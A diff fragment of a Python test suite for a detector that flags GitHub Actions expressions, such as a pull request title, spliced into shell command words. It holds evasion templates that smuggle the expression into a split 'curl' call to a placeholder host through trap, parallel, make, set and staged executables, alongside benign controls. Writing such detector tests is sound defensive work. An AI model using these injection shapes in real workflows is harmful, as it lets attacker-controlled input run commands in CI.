+    ("staged-chmod-exec", "echo 'c{expression}url' > /tmp/f; chmod +x /tmp/f; /tmp/f"),
+    ("sink-trap", 'trap "c{expression}url http://x" EXIT'),
+    ("sink-parallel", "echo 1 | parallel \"c{expression}url http://x\""),
+    ("sink-make", 'make -f /dev/stdin <<<"a:\n\tc{expression}url http://x"'),
+    ("set-positional", 'set -- "c{expression}url http://x"; bash -c "$1"'),
+)
+
+# The controls for the round-5 narrowings. Each one is a legitimate shape that
+# the corresponding new rule would refuse if it were written one step wider:
+# treating `tee` as a sink rather than a writer, promoting any staged file
+# instead of an executed one, sharing one code-flag set across interpreters so
+# `make -f` also flags `python3 -f`, folding `|&` into the sink test the way a
+# real pipe is folded, or reading `set` as a sink because it stages values.
+_ROUND_FIVE_NEGATIVE_CONTROL = (
+    ("tee-writes-it-does-not-run-it", 'echo "{expression}" | tee build.log'),
+    ("staged-file-only-read", 'echo "{expression}" > /tmp/f; cat /tmp/f'),
+    ("interpreter-file-flag", 'python3 build.py -f config.yml --tag "{expression}"'),
+    ("pipe-both-to-a-non-sink", 'echo "{expression}" |& cat'),
+    ("set-options-not-arguments", 'set -euo pipefail\necho "{expression}"'),
+    ("unresolved-name-without-a-code-flag", 'TOOL=./gradlew; $TOOL build "{expression}"'),
+)
+
+
+@pytest.mark.parametrize(("name", "template"), _ROUND_FIVE_EVASIONS)
+def test_round_five_evasions_are_refused(name: str, template: str) -> None:
+    """Each round-5 shape reaches a shell, so command position has to catch it."""
+    body = template.format(expression="${{ github.event.pull_request.title }}")
+    assert policy._splices_expression_into_command_word(body), name
+
+
+@pytest.mark.parametrize(("name", "template"), _ROUND_FIVE_NEGATIVE_CONTROL)
+def test_round_five_narrowings_do_not_over_tighten(name: str, template: str) -> None:
+    """The round-5 rules must not refuse the legitimate shape next door."""
+    body = template.format(expression="${{ github.event.pull_request.title }}")
+    assert not policy._splices_expression_into_command_word(body), name
+
+
+def test_code_flags_are_per_interpreter_not_shared() -> None:
+    """`make -f` reads code; `python3 -f` does not, and sharing one set conflates them.
+
+    Without the split, adding the flag `make` needs would refuse every ordinary
+    `python3 script.py -f config.yml` that also carries an expression.
+    """
+    assert "-f" in policy.SHELL_CODE_FLAG_SINKS["make"]
+    assert "-f" not in policy.SHELL_CODE_FLAG_SINKS["python3"]
+    assert "-exec" not in policy.SHELL_CODE_FLAG_SINKS["python3"]
+    assert "-c" not in policy.SHELL_CODE_FLAG_SINKS["find"]
+
+
+def test_sink_aliases_resolve_through_a_chain() -> None:
+    """A name assigned another name still has to reach the shell it names."""
+    scan = policy._shell_words("A=bash; B=$A; C=$B; $C -c x")
+    assert policy._shell_sink_aliases(scan.words) == {"A": "bash", "B": "bash", "C": "bash"}
+
+
+def test_sink_alias_resolution_terminates_on_a_cycle() -> None:
+    """A self-referential assignment must not spin the resolver."""
+    scan = policy._shell_words("A=$B; B=$A; $A -c x")
+    assert policy._shell_sink_aliases(scan.words) == {}
+
+
+@pytest.mark.parametrize(
+    ("word", "expected"),
+    [
+        ("$SH", "SH"),
+        ("${SH}", "SH"),
+        ('"$SH"', "SH"),
+        ('"${SH}"', "SH"),
+        ("$1", None),
+        ("bash", None),
+        ("c${SH}url", None),
+        ("$(echo bash)", None),
+    ],
+)
+def test_variable_word_recognises_only_a_bare_expansion(word: str, expected: str | None) -> None:
+    """A word that merely contains a variable is not a reference to one."""
+    assert policy._shell_variable_name(word) == expected
 # Issue #3671: nothing stopped a git conflict marker reaching a commit. The
 # detector keys only on the labelled forms git writes and skips fenced code
 # blocks so documentation can quote a conflict.
